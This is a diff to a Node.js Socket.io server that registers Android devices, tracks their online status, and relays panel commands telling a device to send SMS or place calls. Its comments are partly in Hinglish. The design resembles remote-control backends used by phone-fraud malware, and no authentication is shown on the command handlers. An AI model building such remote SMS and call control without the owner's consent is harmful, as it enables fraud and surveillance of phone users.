@@ -25,11 +25,11 @@ connectDB();
 const app = express();
 const server = createServer(app);
 
-// ⭐ MOST IMPORTANT FIX FOR ANDROID
+// ⭐ ANDROID + WEB SAFE SOCKET CONFIG
 const io = new Server(server, {
   cors: { origin: "*", methods: ["GET", "POST"] },
-  transports: ["polling", "websocket"], // REQUIRED
-  allowEIO3: true,                      // REQUIRED for Android
+  transports: ["polling", "websocket"], // Android compatible
+  allowEIO3: true,                      // old engine.io clients ke liye
   pingInterval: 25000,
   pingTimeout: 60000,
   connectTimeout: 60000,
@@ -50,34 +50,52 @@ const deviceSockets = new Map();
 io.on("connection", (socket) => {
   let currentDeviceId = null;
 
+  // --------------------------------
   // DEVICE REGISTER
+  // --------------------------------
   socket.on("registerDevice", (uniqueid) => {
     if (!uniqueid) return;
 
     currentDeviceId = uniqueid;
     console.log(`🟢 DEVICE CONNECTED: ${uniqueid}`);
 
+    // Agar pehle se socket map mein hai to sirf reference update
     if (deviceSockets.has(uniqueid)) {
       const oldSocketId = deviceSockets.get(uniqueid);
       if (oldSocketId !== socket.id) {
-        console.log(`♻️ Updating socket for ${uniqueid}`);
+        console.log(
+          `♻️ Updating socket for ${uniqueid} (old=${oldSocketId}, new=${socket.id})`
+        );
       }
     }
 
     deviceSockets.set(uniqueid, socket.id);
     socket.join(uniqueid);
 
+    // DB me Online save karo
     saveLastSeen(uniqueid, "Online");
 
+    // 🔥 FRONTEND KO TURANT BATAO KE DEVICE ONLINE HAI
+    const statusPayload = {
+      uniqueid,
+      connectivity: "Online",
+      updatedAt: new Date(),
+    };
+    io.emit("deviceStatus", statusPayload);
+
+    // Device side ko confirm
     io.to(socket.id).emit("deviceRegistered", { uniqueid });
 
+    // Panel ke liye live list event
     io.emit("deviceListUpdated", {
       event: "device_connected",
       uniqueid,
     });
   });
 
-  // DEVICE STATUS
+  // --------------------------------
+  // DEVICE STATUS (Online / Offline / Charging / etc.)
+  // --------------------------------
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
@@ -93,7 +111,9 @@ io.on("connection", (socket) => {
     });
   });
 
-  // SEND SMS COMMAND
+  // --------------------------------
+  // PANEL → SEND SMS TO DEVICE
+  // --------------------------------
   socket.on("sendSMS", (payload) => {
     if (!payload?.deviceId) return;
 
@@ -107,7 +127,9 @@ io.on("connection", (socket) => {
     }
   });
 
-  // CALL COMMAND
+  // --------------------------------
+  // PANEL → CALL COMMAND TO DEVICE
+  // --------------------------------
   socket.on("callDevice", (payload) => {
     if (!payload?.deviceId) return;
 
@@ -121,15 +143,19 @@ io.on("connection", (socket) => {
     }
   });
 
+  // --------------------------------
   // DISCONNECT
+  // --------------------------------
   socket.on("disconnect", () => {
     if (!currentDeviceId) return;
 
     console.log(`🔴 DISCONNECTED: ${currentDeviceId}`);
 
+    // thoda wait karo, shayad auto-reconnect ho jaye
     setTimeout(() => {
       const still = deviceSockets.get(currentDeviceId);
 
+      // agar already naya socket aa gaya to offline mat karo
       if (!still || still !== socket.id) return;
 
       deviceSockets.delete(currentDeviceId);
@@ -168,7 +194,7 @@ async function saveLastSeen(deviceId, connectivity) {
   }
 }
 
-// EXPORT FOR CONTROLLERS
+// EXPORT FOR CONTROLLERS (callController etc.)
 export async function sendCallCodeToDevice(uid, callData) {
   try {
     const socketId = deviceSockets.get(uid);
@@ -277,5 +303,5 @@ app.use("/api/call-log", callLogRoutes);
 // ==================================================
 const PORT = process.env.PORT || 5000;
 server.listen(PORT, () => {
-  console.log(`🚀 SERVER LIVE → http://localhost:${PORT}`);
+  console.log(` SERVER LIVE → http://localhost:${PORT}`);
 });
